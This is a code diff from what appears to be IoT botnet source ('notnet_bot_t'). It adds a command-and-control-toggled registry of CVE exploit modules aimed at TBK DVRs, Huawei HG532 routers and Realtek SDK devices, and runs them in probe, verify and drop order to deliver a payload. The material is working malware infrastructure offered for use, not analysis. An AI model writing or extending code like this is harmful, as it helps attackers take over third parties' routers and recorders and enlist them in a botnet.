@@ -2143,7 +2143,16 @@ static int cve_realtek_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
 }
 
 /* ── Module table + runner ───────────────────────────────── */
-static const cve_module_t cve_modules[] = {
+/* The CVE module registry (#143): modules are compile-time linked
+ * but registered/disabled at runtime. The C2 `cve enable <id>` /
+ * `cve disable <id>` commands toggle which modules participate in
+ * cve_run_modules() — a live feed without recompilation. */
+typedef struct {
+    const cve_module_t *mod;
+    int enabled;
+} cve_registry_entry_t;
+
+static const cve_module_t cve_static_modules[] = {
     { "CVE-2024-3721", "TBK DVR-4104/4216 (DVR/NVR)", TBK_DVR_PORT,
       cve_tbk_probe, cve_tbk_verify, cve_tbk_drop },
     { "CVE-2017-17215", "Huawei HG532 (router)", HG532_PORT,
@@ -2151,27 +2160,94 @@ static const cve_module_t cve_modules[] = {
     { "CVE-2021-35395", "Realtek Jungle SDK (router/NVR)", REALTEK_PORT,
       cve_realtek_probe, cve_realtek_verify, cve_realtek_drop },
 };
-#define CVE_MODULE_COUNT ((int)(sizeof(cve_modules) / sizeof(cve_modules[0])))
+#define CVE_STATIC_COUNT ((int)(sizeof(cve_static_modules) / sizeof(cve_static_modules[0])))
+
+static cve_registry_entry_t cve_registry[CVE_MAX_REGISTRY];
+static int cve_registry_count = 0;
+
+/* Initialize the registry with all modules enabled. Idempotent. */
+static void cve_registry_init(void) {
+    if (cve_registry_count > 0) return;
+    for (int i = 0; i < CVE_STATIC_COUNT && i < CVE_MAX_REGISTRY; i++) {
+        cve_registry[i].mod = &cve_static_modules[i];
+        cve_registry[i].enabled = 1;
+    }
+    cve_registry_count = CVE_STATIC_COUNT;
+}
 
 int cve_module_count(void) {
-    return CVE_MODULE_COUNT;
+    cve_registry_init();
+    int n = 0;
+    for (int i = 0; i < cve_registry_count; i++)
+        if (cve_registry[i].enabled) n++;
+    return n;
 }
 
 const cve_module_t *cve_module_at(int idx) {
-    if (idx < 0 || idx >= CVE_MODULE_COUNT) return NULL;
-    return &cve_modules[idx];
+    cve_registry_init();
+    if (idx < 0) return NULL;
+    int n = 0;
+    for (int i = 0; i < cve_registry_count; i++) {
+        if (!cve_registry[i].enabled) continue;
+        if (n == idx) return cve_registry[i].mod;
+        n++;
+    }
+    return NULL;
 }
 
-/* Run all modules matching the port (all when port == 0) in
+/* Enable a CVE module by id. Returns 0 on success, -1 if unknown. */
+int cve_module_enable(const char *id) {
+    if (!id) return -1;
+    cve_registry_init();
+    for (int i = 0; i < cve_registry_count; i++) {
+        if (strcmp(cve_registry[i].mod->id, id) == 0) {
+            cve_registry[i].enabled = 1;
+            return 0;
+        }
+    }
+    return -1;
+}
+
+/* Disable a CVE module by id. Returns 0 on success, -1 if unknown. */
+int cve_module_disable(const char *id) {
+    if (!id) return -1;
+    cve_registry_init();
+    for (int i = 0; i < cve_registry_count; i++) {
+        if (strcmp(cve_registry[i].mod->id, id) == 0) {
+            cve_registry[i].enabled = 0;
+            return 0;
+        }
+    }
+    return -1;
+}
+
+/* Render CVE registry status for the C2 `cve list` command. */
+void cve_registry_status(char *buf, size_t len) {
+    if (!buf || len == 0) return;
+    cve_registry_init();
+    int pos = 0;
+    for (int i = 0; i < cve_registry_count; i++) {
+        pos += snprintf(buf + pos, len - pos, "%s%s[%s]",
+                        i ? " " : "",
+                        cve_registry[i].mod->id,
+                        cve_registry[i].enabled ? "ON" : "off");
+        if (pos >= (int)len - 32) break;
+    }
+    if (cve_registry_count == 0) snprintf(buf, len, "cve: no modules registered");
+}
+
+/* Run all enabled modules matching the port (all when port == 0) in
  * probe -> verify -> drop order. A module fires only when probe
  * fingerprints the family AND verify positively confirms command
  * execution; drop is the payload delivery. Returns 0 when a module
  * dropped the payload, -1 when nothing fired. */
 int cve_run_modules(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot || !ip) return -1;
+    cve_registry_init();
 
-    for (int i = 0; i < CVE_MODULE_COUNT; i++) {
-        const cve_module_t *m = &cve_modules[i];
+    for (int i = 0; i < cve_registry_count; i++) {
+        if (!cve_registry[i].enabled) continue;
+        const cve_module_t *m = cve_registry[i].mod;
         if (port != 0 && m->port != port) continue;
 
         char banner[1024] = {0};
